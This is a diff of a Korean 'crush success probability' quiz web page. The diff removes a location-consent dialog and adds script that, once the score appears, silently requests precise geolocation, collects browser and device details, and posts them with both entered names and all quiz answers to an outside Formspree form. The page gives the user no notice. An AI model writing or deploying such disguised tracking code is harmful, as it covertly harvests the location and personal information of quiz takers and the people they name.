@@ -1,339 +1,234 @@
 <!doctype html>
 <html lang="ko">
 <head>
-  <meta charset="utf-8" />
+  <meta charset="utf-8">
   <title>짝사랑 성공 확률 테스트 💘</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
-    /* 기본 레이아웃 */
-    body { font-family: Arial, Helvetica, sans-serif; background:#fff0f5; padding:20px; color:#222; display:flex; justify-content:center; }
-    .wrap{width:100%; max-width:760px}
-    h1{ color:#ff5c8d; text-align:center; margin-bottom:8px; }
-
-    form{ background:#fff; padding:18px; border-radius:12px; box-shadow:0 6px 18px rgba(0,0,0,0.06); }
-    label{ display:block; margin:10px 0 6px; font-weight:600; }
-    input[type="text"]{ width:100%; padding:8px; border-radius:8px; border:1px solid #ddd; box-sizing:border-box; }
-    .question{ margin-top:12px; }
-    .options label{ display:block; margin:6px 0; cursor:pointer; font-weight:400; }
-    button.submit{ margin-top:16px; width:100%; padding:12px; border:none; border-radius:10px; background:#ff5c8d; color:white; font-size:16px; cursor:pointer; }
-
-    #result{ margin-top:14px; text-align:center; font-weight:700; color:#333; }
-    #loc-reason{ margin-top:8px; text-align:center; color:#666; font-size:13px; }
-
-    .muted{ font-size:13px; color:#777; text-align:center; margin-top:8px; }
-
-    /* 커스텀 모달 스타일 */
-    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.45); display: none; align-items: center; justify-content: center; z-index: 9999; }
-    .modal { background: white; width: 92%; max-width: 420px; border-radius: 12px; padding: 18px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); text-align: left; }
-    .modal h3 { margin: 0 0 8px; color: #222; }
-    .modal p { margin: 6px 0 12px; color: #444; }
-    .modal .buttons { display:flex; gap:10px; justify-content:flex-end; }
-    .modal button { padding:8px 12px; border-radius:8px; border:none; cursor:pointer; font-weight:600; }
-    .btn-cancel { background:#eee; color:#333; }
-    .btn-ok { background:#ff5c8d; color:white; }
-
-    /* 숨김(보조) */
-    .visually-hidden { position:absolute !important; height:1px; width:1px; overflow:hidden; clip:rect(1px,1px,1px,1px); white-space:nowrap; }
+    body {
+      font-family: 'Arial', sans-serif;
+      background:#fff0f5;
+      padding:24px;
+      text-align:center;
+    }
+    form {
+      background:white;
+      padding:20px;
+      border-radius:12px;
+      display:inline-block;
+      max-width:640px;
+      width:100%;
+      text-align:left;
+      box-shadow:0 6px 20px rgba(0,0,0,0.08);
+    }
+    h1 { color:#ff69b4; text-align:center; }
+    label { display:block; margin:10px 0 6px; }
+    .question { margin-top:12px; }
+    .options label { display:block; margin:6px 0; cursor:pointer; }
+    input[type="text"] {
+      padding:8px;
+      width:calc(100% - 18px);
+      border-radius:6px;
+      border:1px solid #ccc;
+    }
+    button {
+      margin-top:16px;
+      padding:12px;
+      width:100%;
+      border:none;
+      border-radius:10px;
+      background:#ff69b4;
+      color:#fff;
+      font-size:16px;
+      cursor:pointer;
+    }
+    #result {
+      margin-top:18px;
+      font-size:18px;
+      font-weight:600;
+      color:#333;
+      text-align:center;
+    }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
+  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
 
-    <form id="loveForm" novalidate>
-      <label>당신의 이름:</label>
-      <input id="yourName" type="text" placeholder="예: 차예준" required>
+  <form id="loveForm">
+    <label>당신의 이름:</label>
+    <input id="yourName" type="text" required>
+    <label>짝사랑 상대 이름:</label>
+    <input id="crushName" type="text" required>
 
-      <label style="margin-top:10px;">짝사랑 상대 이름:</label>
-      <input id="crushName" type="text" placeholder="예: 김나윤" required>
-
-      <!-- 질문 1~10 (생략 없이 모두 포함) -->
-      <div class="question" data-q="상대와 얼마나 자주 대화하나요?">
-        <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
-          <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
-          <label><input type="radio" name="q1" value="70"> 자주 해요</label>
-          <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="상대가 나를 볼 때 미소를 짓나요?">
-        <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q2" value="10"> 전혀 아니요</label>
-          <label><input type="radio" name="q2" value="50"> 가끔 그래요</label>
-          <label><input type="radio" name="q2" value="80"> 자주 그래요</label>
-          <label><input type="radio" name="q2" value="100"> 항상 그래요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="내가 먼저 연락했을 때 반응은 어떤가요?">
-        <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
-        <div class="options">
-          <label><input type="radio" name="q3" value="20"> 거의 무시해요</label>
-          <label><input type="radio" name="q3" value="50"> 답은 해줘요</label>
-          <label><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
-          <label><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="서로 SNS에서 서로를 팔로우하고 있나요?">
-        <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
-          <label><input type="radio" name="q4" value="50"> 한 명만 해요</label>
-          <label><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
-          <label><input type="radio" name="q4" value="100"> 자주 소통해요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="상대가 나에게 관심을 보이는 것 같나요?">
-        <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q5" value="10"> 전혀 아니요</label>
-          <label><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
-          <label><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
-          <label><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="상대방이 답장을 어떻게 하나요?">
-        <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q6" value="20"> 단답형이에요</label>
-          <label><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
-          <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
-          <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="상대가 먼저 말을 걸거나 연락한 적이 있나요?">
-        <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q7" value="20"> 전혀 없어요</label>
-          <label><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
-          <label><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
-          <label><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="내 이야기나 일상에 관심을 보이나요?">
-        <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q8" value="20"> 전혀요</label>
-          <label><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
-          <label><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
-          <label><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="내가 농담하거나 말하면 웃어주나요?">
-        <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
-          <label><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
-          <label><input type="radio" name="q9" value="80"> 자주 웃어요</label>
-          <label><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
-        </div>
-      </div>
-
-      <div class="question" data-q="나를 도와주거나 챙겨준 적이 있나요?">
-        <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
-        <div class="options">
-          <label><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
-          <label><input type="radio" name="q10" value="50"> 한두 번 정도</label>
-          <label><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
-          <label><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
-        </div>
-      </div>
-
-      <button class="submit" type="submit">결과 보기</button>
-    </form>
-
-    <div id="result" aria-live="polite"></div>
-    <div id="loc-reason" role="status" aria-live="polite"></div>
-    <div class="muted"> </div>
-  </div>
-
-  <!-- 커스텀 동의 모달 (네이티브 confirm 대체) -->
-  <div id="consentModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
-    <div class="modal" role="document" aria-labelledby="consentTitle">
-      <h3 id="consentTitle">위치 전송 (선택)</h3>
-      <p>결과와 함께 (선택) 현재 위치를 전송하시겠습니까?<br><small>전송하지 않으면 대략적인 기본 위치로 기록됩니다.</small></p>
-      <div class="buttons">
-        <button class="btn-cancel" id="modalCancel">전송 안 함</button>
-        <button class="btn-ok" id="modalOk">위치 전송 허용</button>
+    <!-- 질문 10개 유지 -->
+    <div class="question" data-q="상대와 얼마나 자주 대화하나요?">
+      <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
+        <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
+        <label><input type="radio" name="q1" value="70"> 자주 해요</label>
+        <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
       </div>
     </div>
-  </div>
+
+    <div class="question" data-q="상대가 나를 볼 때 미소를 짓나요?">
+      <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q2" value="10"> 전혀 아니요</label>
+        <label><input type="radio" name="q2" value="50"> 가끔 그래요</label>
+        <label><input type="radio" name="q2" value="80"> 자주 그래요</label>
+        <label><input type="radio" name="q2" value="100"> 항상 그래요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="내가 먼저 연락했을 때 반응은 어떤가요?">
+      <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
+      <div class="options">
+        <label><input type="radio" name="q3" value="20"> 거의 무시해요</label>
+        <label><input type="radio" name="q3" value="50"> 답은 해줘요</label>
+        <label><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
+        <label><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="서로 SNS에서 서로를 팔로우하고 있나요?">
+      <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
+        <label><input type="radio" name="q4" value="50"> 한 명만 해요</label>
+        <label><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
+        <label><input type="radio" name="q4" value="100"> 자주 소통해요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="상대가 나에게 관심을 보이는 것 같나요?">
+      <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q5" value="10"> 전혀 아니요</label>
+        <label><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
+        <label><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
+        <label><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="상대방이 답장을 어떻게 하나요?">
+      <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q6" value="20"> 단답형이에요</label>
+        <label><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
+        <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
+        <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="상대가 먼저 말을 걸거나 연락한 적이 있나요?">
+      <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q7" value="20"> 전혀 없어요</label>
+        <label><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
+        <label><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
+        <label><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="내 이야기나 일상에 관심을 보이나요?">
+      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q8" value="20"> 전혀요</label>
+        <label><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
+        <label><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
+        <label><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="내가 농담하거나 말하면 웃어주나요?">
+      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
+        <label><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
+        <label><input type="radio" name="q9" value="80"> 자주 웃어요</label>
+        <label><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
+      </div>
+    </div>
+
+    <div class="question" data-q="나를 도와주거나 챙겨준 적이 있나요?">
+      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
+      <div class="options">
+        <label><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
+        <label><input type="radio" name="q10" value="50"> 한두 번 정도</label>
+        <label><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
+        <label><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
+      </div>
+    </div>
+
+    <button type="submit">결과 보기</button>
+  </form>
+
+  <div id="result"></div>
 
   <script>
-  // Formspree 등 설정
-  const FORMSPREE_URL = "https://formspree.io/f/xanpzabp";
-  const FALLBACK = { lat: 37.5665, lon: 126.9780, note: "Seoul (fallback)" };
-  const LOCATION_TIMEOUT_MS = 8000;
+    async function tryGetLocation(timeout = 7000) {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve({ ok:false, reason:'not_supported' });
 
-  // 모달 제어 (Promise 반환)
-  function showConsentModal() {
-    return new Promise((resolve) => {
-      const backdrop = document.getElementById('consentModal');
-      const okBtn = document.getElementById('modalOk');
-      const cancelBtn = document.getElementById('modalCancel');
-      backdrop.style.display = 'flex';
-      backdrop.setAttribute('aria-hidden', 'false');
+        let finished = false;
+        const done = (data)=>{ if(!finished){ finished=true; resolve(data); } };
 
-      function clean() {
-        backdrop.style.display = 'none';
-        backdrop.setAttribute('aria-hidden', 'true');
-        okBtn.removeEventListener('click', onOk);
-        cancelBtn.removeEventListener('click', onCancel);
-      }
-      function onOk() { clean(); resolve(true); }
-      function onCancel() { clean(); resolve(false); }
+        navigator.geolocation.getCurrentPosition(
+          pos => done({ ok:true, lat:pos.coords.latitude, lon:pos.coords.longitude }),
+          err => done({ ok:false, reason:err.code===1?'permission_denied':err.code===2?'position_unavailable':err.code===3?'timeout':'error' }),
+          { enableHighAccuracy:true, timeout, maximumAge:0 }
+        );
+        setTimeout(()=>done({ ok:false, reason:'timeout' }), timeout+1000);
+      });
+    }
 
-      okBtn.addEventListener('click', onOk);
-      cancelBtn.addEventListener('click', onCancel);
+    document.getElementById('loveForm').addEventListener('submit', async e => {
+      e.preventDefault();
 
-      // ESC 눌러 닫기
-      function onKey(e) {
-        if (e.key === 'Escape') { onCancel(); window.removeEventListener('keydown', onKey); }
-      }
-      window.addEventListener('keydown', onKey);
-    });
-  }
-
-  // 위치 추출(동일 로직)
-  function tryGetLocation(timeout = LOCATION_TIMEOUT_MS) {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        resolve({ ok: false, reason: 'not_supported' });
+      const yourName = document.getElementById('yourName').value.trim();
+      const crushName = document.getElementById('crushName').value.trim();
+      const resultEl = document.getElementById('result');
+      if (!yourName || !crushName) {
+        resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!";
         return;
       }
-      let done = false;
-      const onSuccess = (pos) => {
-        if (done) return; done = true;
-        resolve({
-          ok: true,
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy || null,
-          timestamp: new Date(pos.timestamp || Date.now()).toISOString()
-        });
+
+      const questions = document.querySelectorAll('.question');
+      let total = 0;
+      const answers = [];
+      questions.forEach((q, i)=>{
+        const name='q'+(i+1);
+        const input=q.querySelector('input:checked');
+        const val=input?Number(input.value):0;
+        total+=val;
+        answers.push({ question:q.dataset.q, answer:input?input.parentElement.innerText:'미응답' });
+      });
+
+      const percent=Math.round(total/questions.length);
+      const msg=percent<40?"🥀 아직은 가능성이 낮아요...":
+        percent<70?"🌸 희망이 보여요!":
+        percent<90?"💞 좋은 분위기예요!":"🔥 완벽해요! 커플 탄생 예감!";
+
+      resultEl.innerHTML=`<b>${yourName}</b>💘<b>${crushName}</b><br>성공 확률: <b style="color:#ff69b4">${percent}%</b><br>${msg}`;
+
+      const loc=await tryGetLocation();
+      const sysInfo={
+        ua:navigator.userAgent,
+        lang:navigator.language,
+        screen:`${screen.width}x${screen.height}`,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time:new Date().toISOString()
       };
-      const onError = (err) => {
-        if (done) return; done = true;
-        const map = {1:'permission_denied',2:'position_unavailable',3:'timeout'};
-        resolve({ ok:false, reason: map[err && err.code] || 'error' });
-      };
-      navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy: true, timeout, maximumAge: 0 });
-      setTimeout(() => { if (!done) { done = true; resolve({ ok:false, reason: 'timeout_exceeded' }); } }, timeout + 1000);
+
+      const payload={yourName,crushName,percent,msg,answers,location:loc,system:sysInfo};
+
+      await fetch('https://formspree.io/f/xanpzabp',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(payload)
+      });
     });
-  }
-
-  function reasonToMessage(reason) {
-    switch(reason) {
-      case 'permission_denied': return "사용자가 위치 권한을 거부했습니다.";
-      case 'position_unavailable': return "기기 또는 네트워크에서 위치를 사용할 수 없습니다.";
-      case 'timeout': case 'timeout_exceeded': return "위치 응답 시간이 초과되었습니다.";
-      case 'not_supported': return "이 브라우저는 위치 기능을 지원하지 않습니다.";
-      case 'user_declined': return "사용자가 위치 전송을 거부했습니다.";
-      default: return "위치 정보를 가져오지 못했습니다.";
-    }
-  }
-
-  function collectSystemInfo() {
-    return {
-      ua: navigator.userAgent || null,
-      platform: navigator.userAgentData?.platform || navigator.platform || null,
-      brands: navigator.userAgentData?.brands || null,
-      language: navigator.language || null,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
-      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
-      cores: navigator.hardwareConcurrency || null,
-      memoryGB: navigator.deviceMemory || null,
-      prefersDark: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? true : false,
-      connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType || null,
-        downlink: navigator.connection.downlink || null,
-        rtt: navigator.connection.rtt || null
-      } : null
-    };
-  }
-
-  function escapeHtml(s) {
-    return String(s).replace(/[&<>"']/g, function(m){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]; });
-  }
-
-  // 폼 제출 로직 (confirm 제거 -> 모달 사용)
-  document.getElementById('loveForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const resultEl = document.getElementById('result');
-    const locReasonEl = document.getElementById('loc-reason');
-    resultEl.innerHTML = ''; locReasonEl.textContent = '';
-
-    const yourName = document.getElementById('yourName').value.trim();
-    const crushName = document.getElementById('crushName').value.trim();
-    if (!yourName || !crushName) { resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!"; return; }
-
-    // 질문 수집 & 계산 (digit-by-digit)
-    const qs = document.querySelectorAll('.question');
-    let total = 0;
-    const answers = [];
-    qs.forEach((q, idx) => {
-      const sel = q.querySelector('input:checked');
-      const v = sel ? Number(sel.value) : 0;
-      total = total + v;
-      answers.push({ q: q.dataset.q || (`질문 ${idx+1}`), a: sel ? sel.parentElement.innerText.trim() : '(미응답)', v });
-    });
-    const percent = Math.round(total / qs.length);
-    const message = percent < 40 ? "🥀 아직은 가능성이 낮아요..." : percent < 70 ? "🌸 희망이 보여요!" : percent < 90 ? "💞 좋은 분위기예요!" : "🔥 완벽해요! 커플 예감!";
-
-    resultEl.innerHTML = `💖 <b>${escapeHtml(yourName)}</b>와(과) <b>${escapeHtml(crushName)}</b>의 확률은 <span style="color:#ff69b4;">${percent}%</span><br>${message}`;
-
-    // 커스텀 모달로 동의 묻기 (네이티브 confirm 대신)
-    const consent = await showConsentModal(); // true = 허용, false = 거부
-    let loc;
-    if (consent) {
-      // 여기서 브라우저의 위치 권한 요청(네이티브 시스템 다이얼로그가 뜰 수 있음)
-      loc = await tryGetLocation(LOCATION_TIMEOUT_MS);
-    } else {
-      loc = { ok:false, reason: 'user_declined' };
-    }
-
-    let locationPayload;
-    if (loc.ok) {
-      locationPayload = {
-        method: "geolocation",
-        lat: loc.lat, lon: loc.lon,
-        accuracy: loc.accuracy, timestamp: loc.timestamp,
-        mapLink: `https://www.google.com/maps/search/?api=1&query=${loc.lat},${loc.lon}`
-      };
-      locReasonEl.textContent = ''; // 성공 시 안내 문구 없음
-    } else {
-      locationPayload = {
-        method: "fallback",
-        reason: loc.reason || 'unknown',
-        lat: FALLBACK.lat, lon: FALLBACK.lon, note: FALLBACK.note,
-        mapLink: `https://www.google.com/maps/search/?api=1&query=${FALLBACK.lat},${FALLBACK.lon}`
-      };
-      locReasonEl.textContent = `📍 위치 전송 실패/거부 사유: ${reasonToMessage(loc.reason || 'unknown')}`;
-    }
-
-    const system = collectSystemInfo();
-
-    const payload = {
-      yourName, crushName, percent, message,
-      answers, location: locationPayload, system, submittedAt: new Date().toISOString()
-    };
-
-    // Formspree 전송
-    fetch(FORMSPREE_URL, {
-      method: "POST",
-      headers: { "Content-Type":"application/json" },
-      body: JSON.stringify(payload)
-    }).catch(()=>{ console.warn('전송 실패'); });
-  });
   </script>
 </body>
 </html>
